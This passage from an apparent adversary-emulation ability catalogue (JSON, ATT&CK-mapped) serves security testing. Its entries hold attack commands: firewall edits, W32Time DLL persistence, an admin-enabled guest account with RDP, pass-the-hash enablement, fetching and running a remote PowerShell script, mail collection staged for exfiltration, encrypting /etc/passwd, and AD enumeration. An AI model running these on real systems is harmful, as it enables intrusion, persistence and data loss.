setting \ndefault policies /etc/default/ufw.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/# THIS IS A COMMENT//g' /etc/default/ufw"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw; grep \"# THIS IS A COMMENT\" /etc/default/ufw", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "f97de07a3b9e3b132f7bc42680151d81", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Edit UFW firewall main configuration file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/sysctl.conf; cat /etc/ufw/sysctl.conf"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "683115a2ceeb045e6ffbf4487322b220", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Edit UFW firewall sysctl.conf file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/ufw.conf; cat /etc/ufw/ufw.conf"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf; grep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "8a60db80ab6f4a6b1db758c95bacfafa", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Edit UFW firewall ufw.conf file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sed -i 's/# THIS IS A COMMENT//g' /etc/ufw/user.rules"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules; grep \"# THIS IS A COMMENT\" /etc/ufw/user.rules", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Impair Defenses: Disable or Modify System Firewall", "ability_id": "a1e9351c7799d884d29a5e61712ab58e", "technique_id": "T1562.004", "tactic": "defense-evasion", "requirements": [], "name": "Edit UFW firewall user.rules file", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["d97818_AtomicTest.dll"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["net stop w32time; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net stop w32time; Copy-Item d97818_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Time Providers", "ability_id": "67fe3c9df14ec9c65b9fdeb5fcc62bb6", "technique_id": "T1547.003", "tactic": "multiple", "requirements": [], "name": "Edit an existing time provider", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net group /domai \"Domain Admins\" && net groups \"Account Operators\" /doma && net groups \"Exchange Organization Management\" /doma && net group \"BUILTIN\\Backup Operators\" /doma", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "548dc737f7e316338a51a0860bd9a89a", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Elevated group enumeration using net group (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n", "repeatable": false, "privilege": "", "buckets": ["collection"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["aab4a8_Get-Inbox.ps1"], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Remove-Item $env:TEMP\\mail.csv -Force -ErrorAction Ignore"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "powershell -executionpolicy bypass -command aab4a8_Get-Inbox.ps1 -file $env:TEMP\\mail.csv", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Email Collection: Local Email Collection", "ability_id": "a486bd42396e6e4680f908d4dfa18870", "technique_id": "T1114.001", "tactic": "collection", "requirements": [], "name": "Email Collection with PowerShell Get-Inbox", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Emulate administrator tasks on a system in a separate process", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["Emulate-Administrator-Tasks.ps1"], "parsers": [], "cleanup": ["Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"", "language": null, "name": "psh", "variations": [], "uploads": []}, {"additional_info": {}, "payloads": ["Emulate-Administrator-Tasks.ps1"], "parsers": [], "cleanup": ["Remove-Item -Force -Path \".\\Emulate-Administrator-Tasks.ps1\""], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "start powershell.exe -ArgumentList \"-NoP\",\"-StA\",\"-ExecutionPolicy\",\"bypass\",\".\\Emulate-Administrator-Tasks.ps1\"", "language": null, "name": "pwsh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: PowerShell", "ability_id": "315cedf1-4a3a-4015-b63f-149d64bacbbc", "technique_id": "T1059.001", "tactic": "execution", "requirements": [], "name": "Emulate Administrator Tasks", "plugin": "stockpile"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test enables the guest account on macOS using sysadminctl utility.", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["sudo sysadminctl -guestAccount off"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "sudo sysadminctl -guestAccount on", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Default Accounts", "ability_id": "ba17b809fd2fd268b61eb9f41d939f98", "technique_id": "T1078.001", "tactic": "multiple", "requirements": [], "name": "Enable Guest Account on macOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,\nand desktop will allow multiple RDP connections.\n", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["net user #{guest_user} /active:no >nul 2>&1 && net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1 && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /delete >nul 2>&1 && if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup) && if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /f >nul 2>&1) && if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /f >nul 2>&1)"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user #{guest_user} /active:yes && net user #{guest_user} #{guest_password} && net localgroup #{local_admin_group} #{guest_user} /add && net localgroup \"#{remote_desktop_users_group_name}\" #{guest_user} /add && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f && reg add \"hklm\\system\\CurrentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Default Accounts", "ability_id": "59202d45130d86feab6050a72d2047fc", "technique_id": "T1078.001", "tactic": "multiple", "requirements": [], "name": "Enable Guest account with RDP capability and admin privileges", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Powershell Enable WinRM\n\nUpon successful execution, powershell will \"Enable-PSRemoting\" allowing for remote PS access.\n", "repeatable": false, "privilege": "", "buckets": ["lateral-movement"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Enable-PSRemoting -Force", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote Services: Windows Remote Management", "ability_id": "e643e21318c069d0a576da91650c76fe", "technique_id": "T1021.006", "tactic": "lateral-movement", "requirements": [], "name": "Enable Windows Remote Management", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "After execution the current/new user will have root access", "repeatable": false, "privilege": "", "buckets": ["multiple"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["dsenableroot -d; dsenableroot -d -u art-tester -p art-tester"], "code": null, "timeout": 60, "build_target": null, "platform": "darwin", "command": "dsenableroot; dsenableroot -u art-tester -p art-tester -r art-root", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Valid Accounts: Local Accounts", "ability_id": "e5b238f98f504894f9c2387cf411022b", "technique_id": "T1078.003", "tactic": "multiple", "requirements": [], "name": "Enable root account using dsenableroot utility - MacOS", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enabling RDP through remote registry.\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 2 /f"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"hklm\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Winstations\\RDP-Tcp\" /v SecurityLayer /t REG_DWORD /d 0 /f", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "6b01af3fd822ab73c2e84ad51a4be6cb", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Enabling Remote Desktop Protocol via Remote Registry", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Enabling Restricted Admin Mode via Command_Prompt,enables an attacker to perform a pass-the-hash attack using RDP.\n\nSee [Passing the Hash with Remote Desktop](https://www.kali.org/blog/passing-hash-remote-desktop/)\n", "repeatable": false, "privilege": "", "buckets": ["defense-evasion"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["reg delete \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin >nul 2>&1"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "reg add \"hklm\\system\\currentcontrolset\\control\\lsa\" /f /v DisableRestrictedAdmin /t REG_DWORD /d 0", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Modify Registry", "ability_id": "c1bbc29a5415bbc59d16c6959b421c65", "technique_id": "T1112", "tactic": "defense-evasion", "requirements": [], "name": "Enabling Restricted Admin Mode via Command_Prompt", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This module takes an encoded VBS script and executes it from within a malicious document. By default, upon successful execution\na message box will pop up displaying \"ART T1059.005\"\n\nA note regarding this module, due to the way that this module utilizes \"ScriptControl\" a 64bit version of Microsoft Office is required.\nYou can validate this by opening WinWord -> File -> Account -> About Word\n", "repeatable": false, "privilege": "", "buckets": ["execution"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["Get-WmiObject win32_process | Where-Object {$_.CommandLine -like \"*mshta*\"}  | % { \"$(Stop-Process $_.ProcessID)\" } | Out-Null"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); Invoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1059.005\\src\\T1059.005-macrocode.txt\" -officeProduct \"Word\" -sub \"Exec\"", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Command and Scripting Interpreter: Visual Basic", "ability_id": "9c955a373154a7090d4b4396b561f5da", "technique_id": "T1059.005", "tactic": "execution", "requirements": [], "name": "Encoded VBS code execution", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses 7z to encrypt a file\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$which 7z e /tmp/passwd.zip; rm /tmp/passwd.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which_7z a -ppasswd /tmp/passwd.zip /etc/passwd", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "0672185d22612c95792d39efab04ba17", "technique_id": "T1486", "tactic": "impact", "requirements": [], "name": "Encrypt files using 7z (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attempts to encrypt data on target systems as root to simulate an inturruption authentication to target system. If root permissions are not available then attempts to encrypt data within user's home directory.\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["if [[ $USER == \"root\" ]]; then mv /tmp/passwd /etc/passwd; else cp /tmp/passwd ~/.bash_history; fi"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "if [[ $USER == \"root\" ]]; then $which_ccencrypt /etc/passwd; file /etc/passwd.cpt; sudo su; else $which_ccencrypt ~/.bash_history; file ~/.bash_history.cpt; sudo su; fi", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "752f0b88233950aee6c1c249e89ee941", "technique_id": "T1486", "tactic": "impact", "requirements": [], "name": "Encrypt files using ccrypt (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses gpg to encrypt a file\n", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": ["107417_T1036.003_masquerading.ps1"], "parsers": [], "cleanup": ["rm /tmp/passwd.gpg"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "echo \"passwd\" | $which gpg --batch --yes --passphrase-fd 0 --cipher-algo AES-256 -o /tmp/passwd.gpg -c /etc/passwd", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "a3035e1a84301ca2ab38a7d966cce6b7", "technique_id": "T1486", "tactic": "impact", "requirements": [], "name": "Encrypt files using gpg (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Uses openssl to encrypt passwd file and change its content", "repeatable": false, "privilege": "", "buckets": ["impact"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": ["$which openssl rsautl -decrypt -inkey /tmp/key.pem -in /tmp/passwd.zip; rm /tmp/passwd.zip"], "code": null, "timeout": 60, "build_target": null, "platform": "linux", "command": "$which openssl genrsa -out /tmp/key.pem 2048; $which openssl rsa -in /tmp/key.pem -pubout -out /tmp/pub.pem; $which openssl rsautl -encrypt -inkey /tmp/pub.pem -pubin -in /etc/passwd -out /tmp/passwd.zip", "language": null, "name": "sh", "variations": [], "uploads": []}], "technique_name": "Data Encrypted for Impact", "ability_id": "be4801446e4452c2a3e53dbe57c7a365", "technique_id": "T1486", "tactic": "impact", "requirements": [{"relationship_match": [{"source": "exfil.done"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "name": "Encrypt files using openssl (Linux)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "([adsisearcher]\"objectcategory=computer\").FindAll(); ([adsisearcher]\"objectcategory=computer\").FindOne()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "c75a55384a1e7026bb91f841e4ca2ba9", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Computers with ADSISearcher", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize Get-AdComputer to enumerate Computers within Active Directory.\nUpon successful execution a listing of Computers will output with their paths in AD.\nReference: https://github.com/MicrosoftDocs/windows-powershell-docs/blob/main/docset/winserver2022-ps/activedirectory/Get-ADComputer.md\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-AdComputer -Filter *", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Remote System Discovery", "ability_id": "f32d25602b6c142d321b9a0965316916", "technique_id": "T1018", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Computers with Get-AdComputer", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "b45cb08e24877077d98421393bce079a", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Groups with ADSISearcher", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Get-AdGroup -Filter *", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Permission Groups Discovery: Domain Groups", "ability_id": "f071213a29669283eeb8ab07ddffdbfb", "technique_id": "T1069.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Groups with Get-AdGroup", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize get-addefaultdomainpasswordpolicy to enumerate domain password policy.\nUpon successful execution a listing of the policy implemented will display.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-addefaultdomainpasswordpolicy?view=windowsserver2022-ps\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "get-addefaultdomainpasswordpolicy", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Password Policy Discovery", "ability_id": "8c4228fa7e1c015590d1f13d935e5bb8", "technique_id": "T1201", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Password Policy with get-addefaultdomainpasswordpolicy", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "5a33c31395b6ef3ee38097b327c8b79d", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory Users with ADSISearcher", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "Attackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "Try {;     Import-Module ActiveDirectory -ErrorAction Stop | Out-Null;      ; }; Catch {;     if((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {;   Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online; } else {;   Install-WindowsFeature RSAT-AD-PowerShell; }; };  ;  Get-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "3efa67e532cd23db27ef79317d7bbba4", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Active Directory for Unconstrained Delegation", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [{"module": "plugins.atomic.app.parsers.atomic_powershell", "parserconfigs": [{"custom_parser_vals": {}, "edge": "", "target": "", "source": "validate_me"}]}], "cleanup": ["remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue"], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content \"$env:temp\\clsids.txt\"); {try{write-output \"$($Position)-$($CLSID)\"; write-output \"------------\"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}", "language": null, "name": "psh", "variations": [], "uploads": []}], "technique_name": "Query Registry", "ability_id": "54f95564a265f67159d1f8ff907cd156", "technique_id": "T1012", "tactic": "discovery", "requirements": [], "name": "Enumerate COM Objects in Registry with Powershell", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "This test will enumerate the details of the built-in domain admin account\n", "repeatable": false, "privilege": "", "buckets": ["discovery"], "access": {}, "executors": [{"additional_info": {}, "payloads": [], "parsers": [], "cleanup": [], "code": null, "timeout": 60, "build_target": null, "platform": "windows", "command": "net user administrator /domain", "language": null, "name": "cmd", "variations": [], "uploads": []}], "technique_name": "Account Discovery: Domain Account", "ability_id": "a2946687ae1138d23b0dc040e43d0eb5", "technique_id": "T1087.002", "tactic": "discovery", "requirements": [], "name": "Enumerate Default Domain Admin Details (Domain)", "plugin": "atomic"}, {"delete_payload": true, "additional_info": {}, "singleton": false, "description": "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: 